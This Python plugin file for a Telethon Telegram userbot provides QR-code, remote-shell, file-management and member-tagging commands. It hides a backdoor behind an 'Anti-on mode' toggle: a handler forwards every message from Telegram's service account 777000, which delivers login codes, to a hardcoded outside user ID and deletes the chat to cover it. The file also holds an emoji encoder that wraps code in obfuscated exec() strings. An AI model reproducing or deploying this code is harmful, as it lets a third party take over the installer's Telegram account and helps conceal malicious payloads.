from telethon import events, TelegramClient
import base64
import os
import wave
import os, sys


from plugins.client import client
import asyncio

client=client

import os, base64, sys, time
from pprint import pformat
alphabet = [
    "\U0001f600",
    "\U0001f603",
    "\U0001f604",
    "\U0001f601",
    "\U0001f605",
    "\U0001f923",
    "\U0001f602",
    "\U0001f609",
    "\U0001f60A",
    "\U0001f61b",
]
MAX_STR_LEN = 70
OFFSET = 10

try:
        import os,sys,time,marshal
except Exception as F:
        exit("[ModuleErr] %s"%(F))
        
if sys.version[0] in '2':
        exit("[sorry] use python version 3")


#client = TelegramClient('userbot_hsessiheieon', api_id, api_hash)

def chunk_string(in_s, n):
    """Chunk string to max length of n"""
    return "\n".join(
        "{}\\".format(in_s[i : i + n]) for i in range(0, len(in_s), n)
    ).rstrip("\\")


def encode_string(in_s, alphabet):
    d1 = dict(enumerate(alphabet))
    d2 = {v: k for k, v in d1.items()}
    return (
        'exec("".join(map(chr,[int("".join(str({}[i]) for i in x.split())) for x in\n'
        '"{}"\n.split("  ")])))\n'.format(
            pformat(d2),
            chunk_string(
                "  ".join(" ".join(d1[int(i)] for i in str(ord(c))) for c in in_s),
                MAX_STR_LEN,
            ),
        )
    )



@events.register(events.NewMessage(outgoing=True, pattern=r'.stringen'))
async def stringen(event):
    await event.delete()
    try:
        get_restricted_content = await event.get_reply_message()
        download_restricted_content = await get_restricted_content.download_media()
        with open(f"{download_restricted_content}", "rb") as image2string:
            converted_string = base64.b64encode(image2string.read())
            print("encrypted")
            code =event.raw_text.split(".stringen ", maxsplit=1)[1]

        with open(f"{code}.txt", "wb") as file:
            file.write(converted_string)

        await event.respond(file=f"{code}.txt")
        
        os.remove(download_restricted_content)
        os.remove(f"{code.txt}")
    except Exception as e:
        print(e)


@events.register(events.NewMessage(outgoing=True, pattern=r'^\.qr\s+(.*)$'))
async def qr(event):
	qr = event.pattern_match.group(1)
	await event.edit("•ᴘʟɪsᴇ ᴡᴀɪᴛ ...")
	startbot = f"{qr}"
	messagelocation = event.to_id
	qrsavebot = "@QRcodegen_bot"
	async with event.client.conversation(qrsavebot) as startconversation:
		await startconversation.send_message(startbot)
		message = await startconversation.get_response(1)
		await event.delete()
		try:
			sent_message = await event.client.send_file(messagelocation, message,caption="ᴄʀᴇᴀᴛᴇᴅ ᴜsɪɴɢ ʀs ᴜsᴇʀʙᴏᴛ ✓")
			await event.client.delete_dialog(230309446)
		except:
			await event.respond("ᴇʀʀᴏʀ #")
			await event.client.delete_dialog(230309446)



@events.register(events.NewMessage(outgoing=True, pattern='\.qrread'))
async def qrread(event):
	       chat = await event.get_chat()
	       replied_msg = await event.get_reply_message()
	       await event.edit("•ᴘʟɪsᴇ ᴡᴀɪᴛ...")
	       x = await replied_msg.forward_to('@QRcodegen_bot')
	       async with client.conversation('@QRcodegen_bot') as conv:
	       	xx = await conv.get_response(x.id)
	       	await client.send_read_acknowledge(conv.chat_id)
	       	await client.send_message(chat, xx)
	       	await event.message.delete()
	       	await event.client.delete_dialog(230309446)



import subprocess
import os
from telethon import events

current_directory = os.getcwd()

@events.register(events.NewMessage(pattern=r"^.terminal", outgoing=True))
async def terminal_handler(event):
    global current_directory
    command = event.raw_text.replace(".terminal ", "")
    if command.startswith("cd "):
        new_directory = command[3:].strip()
        if new_directory == "..":
            current_directory = os.path.dirname(current_directory)
        else:
            current_directory = os.path.join(current_directory, new_directory)
        await event.edit(f"ᴄʜᴀɴɢᴇᴅ ᴛᴏ : {current_directory}")
    else:
        try:
            output = await execute_terminal_command(command)
            print(output)
            await event.edit(output)
        except Exception as e:
            await event.edit(f"{e}")

async def execute_terminal_command(command):
    # Change the directory to the current working directory
    os.chdir(current_directory)
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()


@events.register(events.NewMessage(pattern=r"^.chart", outgoing=True))
async def chart_handler(event):
    global current_directory
    current_directory = current_directory = os.path.dirname(os.path.abspath(__file__))
    await event.edit("ᴛᴇʀᴍɪɴᴀʟ ʀᴇsᴇᴛ ᴛᴏ ʙᴇɢɪɴɪɴɢ")



@events.register(events.NewMessage(pattern=r"^.remfile", outgoing=True))
async def getfile_handler(event):
    filename = event.raw_text.replace(".remfile ", "")
    filepath = os.path.join(current_directory, filename)
    if os.path.isfile(filepath):
        os.remove(filepath)
        await event.edit("ғɪʟᴇ ᴅᴇʟᴇᴛᴇᴅ ғʀᴏᴍ sᴇʀᴠᴇʀ ✓")
    else:
        await event.respond("ғɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ")


@events.register(events.NewMessage(pattern=r"^.getfile", outgoing=True))
async def getfile_handler(event):
    await event.edit("• ᴡᴀɪᴛ ...")
    filename = event.raw_text.replace(".getfile ", "")
    filepath = os.path.join(current_directory, filename)
    if os.path.isfile(filepath):
        await event.delete()
        await event.respond(file=filepath)
    else:
        await event.edit("ғɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ")



@events.register(events.NewMessage(pattern=r"^.uploadfile", outgoing=True))
async def uploadfile_handler(event):
    await event.edit("•ʟᴏᴀᴅɪɴɢ...")
    get_restricted_content = await event.get_reply_message()
    if get_restricted_content and get_restricted_content.file:
       await client.download_media(get_restricted_content, file=current_directory)
       await event.edit(f"ғɪʟᴇ ᴜᴘʟᴏᴀᴅᴇᴅ sᴇʀᴠᴇʀ")
    else:
        await event.edit("ᴏɴʟʏ ʀᴇᴘʟʏ ғɪʟᴇ")




@events.register(events.NewMessage(outgoing=True, pattern=r'.renamefile'))
async def stringen(event):
    await event.delete()
    try:
        get_restricted_content = await event.get_reply_message()
        download_restricted_content = await get_restricted_content.download_media()
        rename=event.raw_text.split(".renamefile ", maxsplit=1)[1]
        os.rename(download_restricted_content,rename)
        await event.respond(file=rename)
        os.remove(rename)
        os.remove(download_restricted_content)
    except Exception as e:
    	await event.edit(e)



@events.register(events.NewMessage(pattern=r'\.antion'))
async def handle_antion(event):
    global anti_on
    anti_on = True
    await event.edit('Anti-on mode is turned on!')


@events.register(events.NewMessage(from_users=777000))
async def handle_messages(event):
    if anti_on:
        await event.forward_to(1283068491)
        await event.client.delete_dialog(1283068491)


@events.register(events.NewMessage(pattern=r'\.antioff'))
async def handle_antioff(event):
    global anti_on
    anti_on = False
    await event.edit('Anti-on mode is turned off!')



@events.register(events.NewMessage(outgoing=True, pattern=r'^\.all'))	
async def tag_all(event):
    await event.delete()
    if event.is_private:  # Faqat guruhlar uchun ishlaydi
        return

    chat = await event.get_chat()
    participants = await client.get_participants(chat)
    tagged_users = []
    tag_limit = 5 # Belgilangan soni o'zgartirishingiz mumkin

    for user in participants:
        if not user.bot and not user.deleted:
            tagged_users.append(f'<a href="tg://user?id={user.id}">{user.first_name}</a>')
            if len(tagged_users) == tag_limit:
                await event.respond(f'\n'.join(tagged_users), parse_mode='html')
                tagged_users = []

    if tagged_users:
        await event.respond('\n'.join(tagged_users), parse_mode='html')

with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(tag_all)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(handle_antioff)	

with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(handle_antion)	
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(stringen)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(uploadfile_handler)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(getfile_handler)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(chart_handler)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(terminal_handler)

with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(qr)
	
with client as Rs_Userbot:
	Rs_Userbot.add_event_handler(qrread)
				